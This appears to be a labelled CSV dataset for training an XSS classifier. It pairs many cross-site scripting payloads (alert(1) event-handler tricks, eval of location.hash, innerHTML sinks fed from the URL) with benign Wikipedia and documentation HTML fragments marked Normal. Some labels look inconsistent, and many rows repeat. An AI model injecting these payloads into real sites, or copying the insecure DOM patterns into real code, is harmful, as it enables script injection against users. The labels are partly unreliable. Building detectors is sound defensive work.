Sentence,Final_Label
<svg><command onload=alert(1)></command>,Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
<svg><noembed onload=alert(1)></noembed>,Stored XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<meter oncopy=""alert(1)"" contenteditable>test</meter>",Reflected XSS
    <p>,Normal
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<li><cite id=""CITEREFLucas1961"" class=""citation book""><a href=""/wiki/John_Lucas_(philosopher)"" title=""John Lucas (philosopher)"">Lucas, John </a> (1961). ""Minds, Machines and Gödel"".  In Anderson, A.R. (ed.). <a rel=""nofollow"" class=""external text"" href=""http://users.ox.ac.uk/~jrlucas/Godel/mmg.html""><i>Minds and Machines </i> </a>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070819165214/http://users.ox.ac.uk/~jrlucas/Godel/mmg.html"">Archived </a> from the original on 19 August 2007<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">30 August ",Normal
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/deploy.html"">Deploying Spiders</a></li>",Normal
"<style>@keyframes slidein {}</style><embed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></embed>",Stored XSS
"<abbr onpaste=""alert(1)"" contenteditable>test</abbr>",Reflected XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<body onkeypress=""alert(1)"" contenteditable>test</body>",Reflected XSS
"<object onmouseover=""alert(1)"">test</object>",Stored XSS
"<area onkeypress=""alert(1)"" contenteditable>test</area>",Reflected XSS
<i onpointerenter=alert(1)>XSS</i>,Reflected XSS
"<ul><li><a href=""/wiki/Glossary_of_aerospace_engineering"" title=""Glossary of aerospace engineering"">Aerospace engineering </a> </li>",Normal
"<ul><li><a href=""/wiki/Swarm_intelligence"" title=""Swarm intelligence"">Swarm intelligence </a> </li>",Normal
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/architecture.html"">Architecture overview</a></li>",Normal
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
<svg><listing onload=alert(1)></listing>,Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<multicol onmouseout=""alert(1)"">test</multicol>",Reflected XSS
"<nextid onmouseup=""alert(1)"">test</nextid>",Reflected XSS
<svg><frameset onload=alert(1)></frameset>,Stored XSS
"<li id=""cite_note-324""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-324"">^ </a> </b> ",Normal
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
&#x3C,Stored XSS
<svg><nobr onload=alert(1)></nobr>,Stored XSS
"<map onclick=""alert(1)"">test</map>",Reflected XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<ul><li><a href=""/wiki/Timeline_of_artificial_intelligence"" title=""Timeline of artificial intelligence"">Timeline </a> </li>",Normal
 </li>,Normal
"<element draggable=""true"" ondragend=""alert(1)"">test</element>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rp id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rp>",Reflected XSS
 </li>,Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",Stored XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
<image3 onpointerover=alert(1)>XSS</image3>,Reflected XSS
"<iframe onmouseenter=""alert(1)"">test</iframe>",Stored XSS
<embed onpointerover=alert(1)>XSS</embed>,Stored XSS
"<script onclick=""alert(1)"">test</script>",Stored XSS
"<textarea onkeydown=""alert(1)"" contenteditable>test</textarea>",Reflected XSS
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/developer-tools.html"">Using your browser’s Developer Tools for scraping</a></li>",Normal
"<ins onbeforecopy=""alert(1)"" contenteditable>test</ins>",Reflected XSS
<script onpointerup=alert(1)>XSS</script>,Stored XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"	 </span> <span class=""reference-text"">",Normal
<svg><figcaption onload=alert(1)></figcaption>,Stored XSS
"<li><a href=""/wiki/Machine_ethics"" title=""Machine ethics"">Machine ethics </a> </li>",Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
<li onpointerdown=alert(1)>XSS</li>,Reflected XSS
"<script onkeydown=""alert(1)"" contenteditable>test</script>",Stored XSS
"<style>:target {color: red;}</style><frame id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frame>",Reflected XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<svg><li onload=alert(1)></li>,Stored XSS
"<li><a href=""/wiki/Empirical_evidence"" title=""Empirical evidence"">Empirical evidence </a> </li>",Normal
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<style>:target {color:red;}</style><marquee id=x style=""transition:color 1s"" ontransitionend=alert(1)></marquee>",Reflected XSS
"<audio onkeypress=""alert(1)"" contenteditable>test</audio>",Reflected XSS
<svg><keygen onload=alert(1)></keygen>,Stored XSS
":ex/**//*/*/pression(alert(""""))'>",Reflected XSS
"<header draggable=""true"" ondragstart=""alert(1)"">test</header>",Reflected XSS
"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2F978-3-319-16595-0_10"">10.1007/978-3-319-16595-0_10 </a>. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-3-319-16594-3"" title=""Special:BookSources/978-3-319-16594-3""><bdi>978-3-319-16594-3 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Real-Time+Predictive+Modeling+and+Robust+Avoidance+of+Pedestrians+with+Uncertain%2C+Changing+Intentions&amp;rft.series=Springer+Tracts+in+Advanced+Robotics&amp;rft.pages=161-177&amp;rft.pub=Springer%2C+Cham&amp;rft.date=2015&amp;rft_id=info%3Aarxiv%2F1405.5581&amp;rft_id=info%3Adoi%2F10.1007%2F978-3-319-16595-0_10&amp;rft.isbn=978-3-319-16594-3&amp;rft.aulast=Ferguson&amp;rft.aufirst=Sarah&amp;rft.au=Luders%2C+Brandon&amp;rft.au=Grande%2C+Robert+C.&amp;rft.au=How%2C+Jonathan+P.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<li id=""cite_note-sak2015-271""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-sak2015_271-0"">^ </a> </b> ",Normal
"<li><a href=""/wiki/Hard_problem_of_consciousness"" title=""Hard problem of consciousness"">Hard problem of consciousness </a> </li>",Normal
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=10"" title=""Edit section: Perception"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<li class=""toclevel-2 tocsection-31""><a href=""#Artificial_neural_networks""><span class=""tocnumber"">6.5 ",Normal
<svg><frameset onload=alert(1)></frameset>,Stored XSS
"<li><a href=""/wiki/Virtual_reality"" title=""Virtual reality"">Virtual reality </a> </li>",Normal
"<isindex onbeforepaste=""alert(1)"" contenteditable>test</isindex>",Reflected XSS
"<li id=""cite_note-ecthr2016-293""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ecthr2016_293-0"">^ </a> </b> ",Normal
"		<div id=""mw-content-text"" lang=""en"" dir=""ltr"" class=""mw-content-ltr"">",Normal
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">In fiction </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
"<style>@keyframes slidein {}</style><nav style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nav>",Reflected XSS
<frame onpointerdown=alert(1)>XSS</frame>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable>drop here</svg>",Stored XSS
"<dir onkeypress=""alert(1)"" contenteditable>test</dir>",Reflected XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
<svg><span onload=alert(1)></span>,Stored XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<tr draggable=""true"" ondragleave=""alert(1)"">test</tr>",Reflected XSS
"<li><a href=""/wiki/Cross-validation_(statistics)"" title=""Cross-validation (statistics)"">Cross-validation </a> </li> </ul>",Normal
 </li>,Normal
"<style>@keyframes slidein {}</style><style style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></style>",Reflected XSS
<object id=x tabindex=1 onbeforeactivate=alert(1)></object>,Stored XSS
"<track onmouseleave=""alert(1)"">test</track>",Reflected XSS
"<ul><li><a href=""/wiki/Computer_animation"" title=""Computer animation"">Animation </a> </li>",Normal
<multicol onblur=alert(1) tabindex=1 id=x></multicol><input autofocus>,Reflected XSS
<svg><xss onload=alert(1)></xss>,Stored XSS
"	 <div style=""width:52px""><a href=""/wiki/File:Question_book-new.svg"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/50px-Question_book-new.svg.png"" decoding=""async"" width=""50"" height=""39"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/75px-Question_book-new.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/100px-Question_book-new.svg.png 2x"" data-file-width=""512"" data-file-height=""399"" /> </a> </div> </td><td class=""mbox-text"">",Normal
"<select oncut=""alert(1)"" contenteditable>test</select>",Reflected XSS
"<div role=""note"" class=""hatnote navigation-not-searchable"">See also: <a href=""/wiki/Lethal_autonomous_weapon"" title=""Lethal autonomous weapon"">Lethal autonomous weapon </a> </div>",Normal
<svg><blink onload=alert(1)></blink>,Stored XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",Normal
<ins onpointerout=alert(1)>XSS</ins>,Reflected XSS
" </p><p>In classical planning problems, the agent can assume that it is the only system acting in the world, allowing the agent to be certain of the consequences of its actions.<sup id=""cite_ref-Classical_planning_112-0"" class=""reference""><a href=""#cite_note-Classical_planning-112"">&#91;109&#93; </a> </sup> However, if the agent is not the only actor, then it requires that the agent can reason under uncertainty. This calls for an agent that can not only assess its environment and make predictions, but also evaluate its predictions and adapt based on its assessment.<sup id=""cite_ref-Non-deterministic_planning_113-0"" class=""reference""><a href=""#cite_note-Non-deterministic_planning-113"">&#91;110&#93; </a> </sup>",Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<svg><caption onload=alert(1)></caption>,Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Evolutionary_computation"" title=""Template:Evolutionary computation""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Evolutionary_computation"" title=""Template talk:Evolutionary computation""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Evolutionary_computation&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",Normal
<svg><frameset onload=alert(1)></frameset>,Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
<embed src=1 onerror=alert(1) type=image/gif>,Stored XSS
"<li id=""cite_note-52""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-52"">^ </a> </b> ",Normal
<multicol id=x tabindex=1 onfocus=alert(1)></multicol>,Reflected XSS
 </div,Normal
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Jordan, M. I.; Mitchell, T. M. (16 July 2015). ""Machine learning: Trends, perspectives, and prospects"". <i>Science </i>. <b>349 </b> (6245): 255–260. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2015Sci...349..255J"">2015Sci...349..255J </a>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.aaa8415"">10.1126/science.aaa8415 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/26185243"">26185243 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=Machine+learning%3A+Trends%2C+perspectives%2C+and+prospects&amp;rft.volume=349&amp;rft.issue=6245&amp;rft.pages=255-260&amp;rft.date=2015-07-16&amp;rft_id=info%3Apmid%2F26185243&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.aaa8415&amp;rft_id=info%3Abibcode%2F2015Sci...349..255J&amp;rft.aulast=Jordan&amp;rft.aufirst=M.+I.&amp;rft.au=Mitchell%2C+T.+M.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<style>@keyframes x{}</style><meta style=""animation-name:x"" onanimationstart=""alert(1)""></meta>",Reflected XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
